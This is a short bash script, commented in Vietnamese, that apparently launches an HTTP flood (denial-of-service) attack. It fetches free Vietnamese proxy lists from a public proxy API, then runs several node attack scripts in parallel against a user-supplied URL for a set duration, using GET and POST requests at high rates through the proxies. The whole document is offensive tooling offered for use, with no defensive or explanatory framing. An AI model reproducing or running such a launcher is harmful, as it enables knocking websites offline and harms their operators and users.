#!/bin/bash

[ $# -lt 2 ] && echo "Usage: $0 {URL} {TIME}" && exit 1
URL=$1
TIME=$2

# Xoá proxy cũ, tải mới
> live.txt
for t in http https; do
  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$t"
done | sort -u > live.txt

for m in GET POST; do
  node h1.js $m "$URL" live.txt "$TIME" 999 15 randomstring=true &
  node hmix.js -m $m -u $URL -s $TIME -p hihi.txt -t 10 -r 999 --full true -d false &
  #node fixed.js "$URL" "$TIME" 1 1 hihi.txt --verify true || true & 
done
wait
